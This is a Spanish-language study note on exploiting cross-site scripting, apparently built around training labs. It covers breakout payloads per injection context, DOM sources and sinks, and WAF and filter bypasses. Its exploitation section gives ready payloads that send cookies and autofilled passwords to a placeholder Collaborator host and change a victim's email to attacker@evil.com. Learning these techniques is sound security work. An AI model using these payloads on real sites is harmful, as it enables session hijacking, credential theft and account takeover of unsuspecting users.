---
aliases:
  - XSS
  - Cross-Site Scripting
  - cross-site-scripting
  - xss-entrypoint
tags:
  - vuln/xss
  - tipo/injection
  - entrypoint
---

# XSS (Cross-Site Scripting) — Punto de entrada

> Documento **agnóstico al negocio**: responde *cómo **explotar** un XSS ya localizado*.
> **Dónde** buscarlo en el target y para qué objetivo → eso vive en los `STAGE_x` (recon del negocio).

## 📚 Referencias rápidas

- 🧪 **Laboratorios** — 25 labs (Apprentice + Practitioner), orden oficial + foco de cada uno: [labs/README.md](labs/README.md)
- 📄 **Cheat sheet** — vectores por contexto, event handlers, tags, polyglots, exfiltración: [cheat-sheet.md](cheat-sheet.md)
- 🕶️ **Ofuscación / bypass de filtros** (sin `()`, `\xNN`, sin keywords…): [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]]
- 🖼️ **Entrega vía iframe** (DOM XSS por `hashchange`, etc.): [ejemplo-iframe.html](ejemplo-iframe.html)

## 🗂️ Tipos de XSS (mapa)

- **Reflected:** el payload viaja en la **petición** (query/param) y **vuelve en la respuesta** de esa misma request. No persiste → hay que **entregárselo a la víctima** (link/exploit server). → [[#🧭 Contextos de inyección (lo central del XSS)|contextos]].
- **Stored (persistente):** el payload se **guarda** en el servidor (comentario, perfil, nombre…) y se ejecuta cada vez que **alguien carga** esa página. La víctima llega sola. → [[#🧭 Contextos de inyección (lo central del XSS)|contextos]].
- **DOM-based:** el sink está en **JavaScript del cliente** (`innerHTML`, `document.write`, `eval`, jQuery `$()`, `location`…). El servidor puede no reflejar nada; se rompe en el navegador. → [[#🌳 DOM XSS — source → sink|DOM XSS]].

> El eje real del XSS **no es** reflected/stored/DOM, sino **el contexto donde cae tu input** (HTML, atributo, string JS, template literal, URL). El contexto decide el *breakout*. Ver abajo.

## 🧪 Cómo explotar (metodología)

1. **Marcar y localizar el reflejo:** inyectá un canario único (`xss1234`) y buscalo en la respuesta (Ctrl+F). ¿Cuántas veces aparece? ¿Dónde?
2. **Identificar el contexto** de *cada* reflejo: ¿HTML crudo? ¿dentro de un atributo (`value="..."`)? ¿dentro de `<script>` (string JS / template literal)? ¿en un `href`/`src`? ¿dentro de otro tag (`<select>`, `<title>`, comentario `<!-- -->`)?
3. **Diseñar el breakout** según el contexto → ver [[#🧭 Contextos de inyección (lo central del XSS)|tabla de contextos]].
4. **Confirmar con PoC** inofensivo: `alert(1)` / `print()` (el sandbox del navegador headless a veces bloquea `alert`; `print()` es más fiable en labs).
5. **Si hay filtro/WAF:** fuzzear qué **tags/atributos/eventos** pasan (Intruder con listas de la cheat sheet) → ofuscar → ver [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]].
6. **Armar el payload real** (objetivo abajo) y, si es reflected/DOM, **entregarlo a la víctima** por el exploit server.

## 🧭 Contextos de inyección (lo central del XSS)

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos. El contexto define el *breakout*; el payload va después.

<table>
<tr><th>Dónde cae tu input</th><th>Cómo se rompe (breakout)</th><th>Ejemplo</th></tr>
<tr><td><b>HTML crudo</b> (texto de la página)</td><td>Inyectás un tag directamente</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
<tr><td><b>Dentro de un atributo</b> <code>value="AQUÍ"</code></td><td>Cerrás la comilla + el tag, o metés un event handler si <code>&lt;&gt;</code> están filtrados</td><td><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>si no hay <code>&lt;&gt;</code>: <code>" autofocus onfocus="alert(1)</code></td></tr>
<tr><td><b>String JS</b> dentro de <code>&lt;script&gt;…'AQUÍ'…&lt;/script&gt;</code></td><td>Cerrás la comilla y encadenás; o cerrás el bloque <code>&lt;/script&gt;</code></td><td><code>'-alert(1)-'</code>　<code>';alert(1)//</code><br>si escapan comillas: <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
<tr><td><b>String JS con <code>\</code> NO filtrado</b></td><td>Anulás el escape con tu propio backslash</td><td><code>\'-alert(1)//</code></td></tr>
<tr><td><b>Template literal</b> <code>`…AQUÍ…`</code></td><td>Ejecutás dentro de <code>${}</code> sin romper nada</td><td><code>${alert(1)}</code></td></tr>
<tr><td><b>URL / <code>href</code> / <code>src</code></b></td><td>Protocolo <code>javascript:</code></td><td><code>javascript:alert(1)</code></td></tr>
<tr><td><b>Dentro de otro tag</b> (<code>&lt;select&gt;</code>, <code>&lt;title&gt;</code>, <code>&lt;textarea&gt;</code>)</td><td>Cerrás ese tag primero</td><td><code>&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
</table>

**Reglas rápidas de contexto:**
- `innerHTML` / marcado inyectado **no ejecuta `<script>`** → usá un tag con event handler (`<img src=x onerror=...>`, `<svg onload=...>`).
- En **atributo** con `<>` codificados → no podés abrir tags; tu vector es un **event handler** (`onmouseover`, `onfocus`+`autofocus`, `onerror`).
- En **`<script>` string** con comillas escapadas pero **`</script>` permitido** → salí del bloque entero.

## 🔤 Escapes en string JS (breakout detallado)

> Estás dentro de `<script>…var x = 'AQUÍ';…</script>`. Para ejecutar tenés que **cerrar el string** (`'`). El defensor intenta impedirlo escapando caracteres. La pregunta clave es **qué escapan y qué NO**.

**Caso A — escapan `'` (con `\`) y `<>` están codificados.** No podés cerrar la comilla ni abrir un tag normal. → **Salí del bloque `<script>` entero:**
<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
El parser HTML ve `</script>` **aunque esté dentro de un string JS** y cierra el bloque; después abrís uno tuyo. (Lab 18.)

**Caso B — escapan `'` pero NO escapan el `\`.** Acá está el truco que te confundía. Vos mandás `\'`:
<pre><code>\'-alert(1)//</code></pre>
- El filtro ve tu `'` y le antepone su backslash → lo convierte en `\'`.
- Pero tu `\` **no lo tocan**, así que en la página queda: `\` (tuyo) + `\'` (lo que produjo el filtro) = <mark>`\\'`</mark>.
- Para JavaScript, `\\` es **un backslash literal** (escape completo) → y entonces el `'` que sigue **queda libre y CIERRA el string**. 💥
- Resultado: cerraste la comilla, y `-alert(1)//` se ejecuta. **En una frase:** tu `\` "se come" al `\` del filtro, dejando tu `'` suelto. (Lab 19.)

**Otros casos generales (no tan específicos):**
- **Template literal** `` `…AQUÍ…` `` → no necesitás romper comilla: ejecutás dentro de `${alert(1)}`. (Lab 21.)
- **Sin necesidad de comillas** → si el reflejo está fuera del string (p. ej. entre sentencias), inyectás directo `;alert(1);//`.
- **HTML entities en atributos** → si el string JS está en un atributo (`onclick="… 'AQUÍ' …"`), el navegador **decodifica entidades** antes de pasar al JS → `&apos;-alert(1)-&apos;`. (Lab 20.)
- **Regla mental:** primero probá `'` a secas y mirá **cómo aparece** en la respuesta (Ctrl+F). Según lo que hayan escapado (`'`? `\`? `<>`? backtick?) elegís: cerrar comilla / anular escape con `\` / salir del `<script>` / usar `${}` / usar entidades.

## 🌳 DOM XSS — source → sink

> No confíes solo en el reflejo del servidor: seguí el **dato en el JS del cliente**. Usá **DOM Invader** (Burp) para automatizar source→sink.

- **Sources** (de dónde sale el dato atacable): `location.search`, `location.hash`, `document.URL`, `document.referrer`, `window.name`, `postMessage`.
- **Sinks** (dónde se ejecuta): `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`, `Function`, `location`/`location.href`, jQuery `$()`, `.html()`, `.attr('href', …)`.
- **Patrón típico:** `location.search` → `document.write` (busca img/script), `location.hash` → jQuery `$(hash)` (necesita `hashchange` → entregar por **iframe**, ver [ejemplo-iframe.html](ejemplo-iframe.html)).
- **jQuery `attr('href', …)`** → sink de atributo → payload `javascript:alert(1)`.
- **AngularJS** (`ng-app` presente): aunque filtren `<>` y `"`, inyectás una **expresión** Angular: `{{$on.constructor('alert(1)')()}}`.

## 🎯 Qué hacer con un XSS (objetivos de explotación)

> Ya ejecutás JS en el contexto de la víctima. Ahora lo weaponizás. (El *para qué* concreto del target → STAGE.)

- **Robar la cookie de sesión** (si no es `HttpOnly`) → *session hijacking*:
  <pre><code>&lt;script&gt;fetch('https://<mark>BURP-COLLABORATOR</mark>/?c='+document.cookie)&lt;/script&gt;</code></pre>
- **Capturar credenciales** (autofill del gestor de contraseñas):
  <pre><code>&lt;input name=username&gt;&lt;input type=password name=password onchange="fetch('https://<mark>BURP-COLLABORATOR</mark>',{method:'POST',body:username.value+':'+this.value})"&gt;</code></pre>
- **Actuar en la sesión de la víctima** (cookie `HttpOnly` → no la robás pero **actuás como ella**): leer el **CSRF token** de una página y forjar la request (**bypass de CSRF**):
  <pre><code>&lt;script&gt;
  fetch('/my-account').then(r=&gt;r.text()).then(t=&gt;{
    let token=t.match(/name="csrf" value="([^"]+)"/)[1];
    fetch('/my-account/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'csrf='+token+'&email=<mark>attacker@evil.com</mark>'});
  });
  &lt;/script&gt;</code></pre>
- **Exfiltrar datos same-origin** (`/my-account`, `apiKey`, etc.) con `fetch` y mandarlos al Collaborator.
- **Sin JS ejecutable (CSP estricto)** → *scriptless* / **dangling markup**: filtrás datos (p. ej. el CSRF token) con marcado colgante que dispara una request a tu servidor. Ver [cheat-sheet.md](cheat-sheet.md).

## 🛡️ CSP y bypass (nota rápida)

- **CSP** puede bloquear tu JS aunque el XSS exista. Revisá el header `Content-Security-Policy`.
- Vectores cuando hay CSP: **dangling markup** (exfiltrar sin ejecutar JS), directivas mal configuradas (`script-src` con dominios/`nonce` reutilizables, `unsafe-inline`), o abusar de un endpoint permitido. Detalle en la [cheat-sheet.md](cheat-sheet.md).

## 🧱 Bloqueos de WAF (tags / eventos)

> El WAF filtra un *subconjunto*, casi nunca todo. La estrategia es **descubrir qué dejan pasar** fuzzeando y después armar el vector con eso.

**1) ¿Bloqueo de tags?** No sabés cuál pasa → **probalos todos** con Intruder:
- Payload base `<§§>` (posición en el nombre del tag) + lista de tags de la [cheat-sheet.md](cheat-sheet.md) / oficial.
- Mirá el **código de respuesta / longitud**: el tag que **no** te bloquean es el candidato.
- Si **todos los estándar** están bloqueados → probá **custom tags**: `<xss onfocus=alert(1) tabindex=1 id=x></xss>` y navegá a `#x` para autoenfocarlo. (Lab 15.)
- Si dejan **algo de SVG** → `<svg>`, `<animatetransform onbegin=...>`, etc. (Lab 16.)

**2) ¿Bloqueo de eventos?** Encontraste un tag válido pero el evento no dispara → **probá todos los eventos**:
- Payload base `<TAG_VÁLIDO §§=alert(1)>` (posición en el nombre del evento) + lista de event handlers.
- Ojo con **cuáles requieren interacción**: preferí los que disparan solos (`onload`, `onerror`, `onfocus`+`autofocus`, `onbegin`). Los de interacción (`onclick`, `onmouseover`) necesitan que la víctima haga algo → o forzás con `accesskey`. (Lab 17.)

**3) Soluciones típicas por bloqueo:**

<table>
<tr><th>Bloqueo</th><th>Solución</th></tr>
<tr><td>Tags estándar</td><td>Custom tags (<code>&lt;xss ...&gt;</code>) + <code>onfocus</code>/<code>autofocus</code> o <code>#id</code></td></tr>
<tr><td>La mayoría de tags/atributos</td><td>Fuzzear cuál pasa (Intruder) y construir con ese</td></tr>
<tr><td>Solo SVG permitido</td><td><code>&lt;svg&gt;&lt;animatetransform onbegin=...&gt;</code></td></tr>
<tr><td>Paréntesis <code>()</code></td><td><code>throw</code>+<code>onerror</code>, backticks, <code>setTimeout`...`</code> → [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]]</td></tr>
<tr><td>Keywords (<code>alert</code>, <code>script</code>)</td><td>Entidades HTML / <code>\xNN</code> / <code>eval(atob(...))</code></td></tr>
<tr><td>Comillas / <code>&lt;&gt;</code></td><td>Ver [[#🔤 Escapes en string JS (breakout detallado)|escapes de string JS]] y contexto de atributo</td></tr>
</table>

## ⚙️ Filtros / ofuscación

Detalle completo de ofuscación (sin `()`, `\xNN`, base64, sin keywords, encodings por objetivo) en → [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]].

## 🐍 Exploits rápidos

Snippets JS listos para exfiltrar (img / fetch / form, con la URL de Collaborator como variable): [exfil-payloads.js](exfil-payloads.js).
